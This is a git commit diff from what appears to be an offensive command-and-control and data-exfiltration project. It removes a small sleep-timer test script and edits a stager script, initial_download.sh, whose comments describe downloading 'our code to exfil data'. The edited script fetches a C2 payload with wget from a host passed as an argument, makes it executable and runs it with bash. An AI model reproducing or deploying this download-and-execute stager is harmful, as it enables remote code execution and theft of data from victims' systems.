c08e74e435fe7d723bac4321748f68ef04cf4b6d
kScrane <124896848+kScrane@users.noreply.github.com>
2023-04-30 20:27:40 -0400

    Added Docker

--- C2/test.sh
+++
@@ -1,6 +0,0 @@
-current=$(date +%s)
-target=$(date -j '1:00' +%s)
-sleep_seconds=$(( $target_epoch - $current_epoch ))
-sleep $sleep_seconds
-
-#echo $sleep_seconds
--- Exfil_Data/initial_download.sh
+++ Exfil_Data/initial_download.sh
@@ -5,8 +5,9 @@
 
 #Part 1: load commands + post data on website
 #download our code to exfil data
-code_name="C2.sh"
-wget -O $code_name http://127.0.0.1:8000/C2_code
+code_name="C2"
+wget -O $code_name http://$1:8000/C2_code
 chmod +x $code_name
+/bin/bash C2 $1
 
 #TODO: rm self once done
